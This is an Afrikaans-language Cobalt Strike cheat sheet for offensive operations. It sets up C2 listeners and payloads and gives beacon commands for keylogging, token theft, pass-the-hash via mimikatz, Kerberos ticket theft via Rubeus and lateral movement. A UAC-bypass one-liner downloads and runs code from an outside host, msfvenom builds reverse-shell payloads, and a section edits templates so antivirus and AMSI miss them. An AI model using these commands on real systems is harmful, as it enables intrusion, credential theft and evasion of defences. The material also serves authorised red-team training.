# Cobalt Strike

### Luisteraars

### C2 Luisteraars

`Cobalt Strike -> Luisteraars -> Toevoegen/Bewerken` dan kan jy kies waar om te luister, watter soort beacon om te gebruik (http, dns, smb...) en meer.

### Peer2Peer Luisteraars

Die beacons van hierdie luisteraars hoef nie direk met die C2 te praat nie, hulle kan daarmee kommunikeer deur ander beacons.

`Cobalt Strike -> Luisteraars -> Toevoegen/Bewerken` dan moet jy die TCP of SMB beacons kies

* Die **TCP beacon sal 'n luisteraar op die gekose poort stel**. Om aan te sluit by 'n TCP beacon gebruik die opdrag `connect <ip> <port>` van 'n ander beacon
* Die **smb beacon sal luister in 'n pypnaam met die gekose naam**. Om aan te sluit by 'n SMB beacon moet jy die opdrag `link [target] [pipe]` gebruik.

### Genereer & Berg payloads op

#### Genereer payloads in lêers

`Aanvalle -> Pakkette ->`&#x20;

* **`HTMLApplication`** vir HTA lêers
* **`MS Office Macro`** vir 'n kantoor dokument met 'n makro
* **`Windows Uitvoerbare`** vir 'n .exe, .dll of diens .exe
* **`Windows Uitvoerbare (S)`** vir 'n **stageless** .exe, .dll of diens .exe (beter stageless as staged, minder IoCs)

#### Genereer & Berg payloads op

`Aanvalle -> Web Drive-by -> Geskripteerde Web Aflewering (S)` Dit sal 'n skrip/uitvoerbare lêer genereer om die beacon van cobalt strike af te laai in formate soos: bitsadmin, exe, powershell en python

#### Berg Payloads op

As jy reeds die lêer het wat jy wil berg in 'n webbediener, gaan net na `Aanvalle -> Web Drive-by -> Berg Lêer op` en kies die lêer om op te berg en webbediener konfigurasie.

### Beacon Opsies

<pre class="language-bash"><code class="lang-bash"># Voer plaaslike .NET binêre uit
execute-assembly &#x3C;/path/to/executable.exe>

# Skermskote
printscreen    # Neem 'n enkele skermskoot via die PrintScr metode
screenshot     # Neem 'n enkele skermskoot
screenwatch    # Neem periodieke skermskote van die skerm
## Gaan na View -> Skermskote om hulle te sien

# sleutellogger
keylogger [pid] [x86|x64]
## View > Keystrokes om die gedrukte sleutels te sien

# poortskandering
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Injecteer poortskandering aksie binne 'n ander proses
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
# Importeer Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell &#x3C;skryf net powershell opdrag hier>

# Gebruiker simulasie
## Token generasie met geloofsbriewe
make_token [DOMAIN\user] [password] # Skep 'n token om 'n gebruiker in die netwerk te simuleer
ls \\computer_name\c$ # Probeer om die gegenereerde token te gebruik om toegang te verkry tot C$ op 'n rekenaar
rev2self # Hou op om die token wat gegenereer is met make_token te gebruik
## Die gebruik van make_token genereer gebeurtenis 4624: 'n Rekening is suksesvol aangemeld. Hierdie gebeurtenis is baie algemeen in 'n Windows domein, maar kan beperk word deur te filtreer op die Aanmeldingstipe. Soos hierbo genoem, gebruik dit LOGON32_LOGON_NEW_CREDENTIALS wat tipe 9 is.

# UAC Bypass
elevate svc-exe &#x3C;luisteraar>
elevate uac-token-duplication &#x3C;luisteraar>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steel token van pid
## Soos make_token, maar steel die token van 'n proses
steal_token [pid] # Dit is ook nuttig vir netwerkaksies, nie plaaslike aksies nie
## Uit die API-dokumentasie weet ons dat hierdie aanmeldingstipe "die oproeper in staat stel om sy huidige token te kloon". Dit is hoekom die Beacon-uitset sê Impersonated &#x3C;current_username> - dit simuleer ons eie gekloonde token.
ls \\computer_name\c$ # Probeer om die gegenereerde token te gebruik om toegang te verkry tot C$ op 'n rekenaar
rev2self # Hou op om die token van steal_token te gebruik

## Lancering van proses met nuwe geloofsbriewe
spawnas [domain\username] [password] [luisteraar] # Doen dit vanaf 'n gids met leestoegang soos: cd C:\
## Soos make_token, sal dit Windows-gebeurtenis 4624 genereer: 'n Rekening is suksesvol aangemeld, maar met 'n aanmeldingstipe van 2 (LOGON32_LOGON_INTERACTIVE). Dit sal die oproepende gebruiker (TargetUserName) en die gesimuleerde gebruiker (TargetOutboundUserName) beskryf.

## Injecteer in proses
inject [pid] [x64|x86] [luisteraar]
## Vanuit 'n OpSec-oogpunt: Moenie kruisplatform-injectie uitvoer tensy jy regtig moet nie (bv. x86 -> x64 of x64 -> x86).

## Pass die hash
## Hierdie wysigingsproses vereis patching van LSASS-geheue wat 'n hoë-risiko-aksie is, vereis plaaslike admin-voorregte en is nie altyd lewensvatbaar as Protected Process Light (PPL) geaktiveer is nie.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass die hash deur mimikatz
mimikatz sekurlsa::pth /user:&#x3C;username> /domain:&#x3C;DOMAIN> /ntlm:&#x3C;NTLM HASH> /run:"powershell -w hidden"
## Sonder /run, sal mimikatz 'n cmd.exe spawn, as jy as 'n gebruiker met 'n skerm hardloop, sal hy die skerm sien (as jy as SYSTEM hardloop, is jy reg om te gaan)
steal_token &#x3C;pid> #Steel token van proses wat deur mimikatz geskep is

## Pass die kaartjie
## Versoek 'n kaartjie
execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;username> /domain:&#x3C;domain> /aes256:&#x3C;aes_keys> /nowrap /opsec
## Skep 'n nuwe aanmeldsessie om saam met die nuwe kaartjie te gebruik (om nie die gekompromitteerde een te oorskryf nie)
make_token &#x3C;domain>\&#x3C;username> DummyPass
## Skryf die kaartjie in die aanvaller se masjien vanuit 'n poweshell-sessie &#x26; laai dit
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass die kaartjie vanaf SYSTEM
## Skep 'n nuwe proses met die kaartjie
execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;USERNAME> /domain:&#x3C;DOMAIN> /aes256:&#x3C;AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steel die token van daardie proses
steal_token &#x3C;pid>

## Haal kaartjie uit + Pass die kaartjie
### Lys kaartjies
execute-assembly C:\path\Rubeus.exe triage
### Dump interessante kaartjie deur luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:&#x3C;luid> /nowrap
### Skep 'n nuwe aanmeldsessie, neem luid en proses-ID op
execute-assembly C:\pad\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Voeg kaartjie in in gegenereerde aanmeldsessie
execute-assembly C:\pad\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-kaartjie...]
### Steel uiteindelik die token van daardie nuwe proses
steal_token &#x3C;pid>

# Laterale beweging
## As 'n token geskep is, sal dit gebruik word
jump [metode] [teiken] [luisteraar]
## Metodes:
## psexec                    x86   Gebruik 'n diens om 'n Service EXE-artefak uit te voer
## psexec64                  x64   Gebruik 'n diens om 'n Service EXE-artefak uit te voer
## psexec_psh                x86   Gebruik 'n diens om 'n PowerShell-eenreëliner uit te voer
## winrm                     x86   Voer 'n PowerShell-skripsie uit via WinRM
## winrm64                   x64   Voer 'n PowerShell-skripsie uit via WinRM

remote-exec [metode] [teiken] [opdrag]
## Metodes:
<strong>## psexec                          Voer op afstand uit via die Diensbeheerder
</strong>## winrm                           Voer op afstand uit via WinRM (PowerShell)
## wmi                             Voer op afstand uit via WMI

## Om 'n beacon met wmi uit te voer (dit is nie in die jump-opdrag nie) laai net die beacon op en voer dit uit
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Gee sessie aan Metasploit - Deur middel van 'n luisteraar
## Op Metasploit-gashuis
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## Op cobalt: Luisteraars > Voeg by en stel die Payload in op Foreign HTTP. Stel die Host in op 10.10.5.120, die Poort op 8080 en klik op Stoor.
beacon> spawn metasploit
## Jy kan slegs x86 Meterpreter-sessies spawn met die vreemde luisteraar.

# Gee sessie aan Metasploit - Deur middel van shellcode-injeksie
## Op Metasploit-gashuis
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f raw -o /tmp/msf.bin
## Voer msfvenom uit en berei die multi/handler-luisteraar voor

## Kopieer binêre lêer na cobalt strike-gashuis
ps
shinject &#x3C;pid> x64 C:\Payloads\msf.bin #Injecteer Metasploit shellcode in 'n x64-proses

# Gee Metasploit-sessie aan cobalt strike
## Genereer stageless Beacon shellcode, gaan na Aanvalle > Pakkette > Windows Uitvoerbare lêer (S), kies die gewenste luisteraar, kies Raw as die Uitvoertipe en kies Gebruik x64-payload.
## Gebruik post/windows/manage/shellcode_inject in Metasploit om die gegenereerde cobalt strike shellcode in te spuit


# Pivoting
## Maak 'n sokkiesproksi oop in die spanbediener
beacon> socks 1080

# SSH-verbinding
beacon> ssh 10.10.17.12:22 gebruikersnaam wagwoord</code></pre>

## Vermy AV's

### Artefaktkit

Gewoonlik in `/opt/cobaltstrike/artifact-kit` kan jy die kode en vooraf saamgestelde sjablone (in `/src-common`) van die payloads vind wat cobalt strike gaan gebruik om die binêre beacons te genereer.

Deur [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) te gebruik met die gegenereerde agterdeur (of net met die saamgestelde sjabloon) kan jy vind wat verdediger aktiveer. Dit is gewoonlik 'n string. Jy kan dus net die kode wat die agterdeur genereer wysig sodat daardie string nie in die finale binêre lêer verskyn nie.

Nadat jy die kode gewysig het, voer jy net `./build.sh` uit vanuit dieselfde gids en kopieer die `dist-pipe/`-gids na die Windows-kliënt in `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Moenie vergeet om die aggressiewe skrip `dist-pipe\artifact.cna` te laai om aan te dui dat Cobalt Strike die hulpbronne vanaf die skyf moet gebruik wat ons wil hê en nie die een wat gelaai is nie.

### Hulpbronpakket

Die Hulpbronpakket-vouer bevat die sjablone vir Cobalt Strike se skripsgebaseerde vragte, insluitend PowerShell, VBA en HTA.

Deur [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) saam met die sjablone te gebruik, kan jy vind wat die verdediger (AMSI in hierdie geval) nie wil hê nie en dit wysig:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
### Verander die opgespoorde lyne sodat jy 'n sjabloon kan genereer wat nie opgemerk sal word nie.

Moenie vergeet om die aggressiewe skrip `ResourceKit\resources.cna` te laai om aan te dui dat Cobalt Strike die hulpbronne vanaf die skyf moet gebruik wat ons wil hê en nie die een wat gelaai is nie.
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```

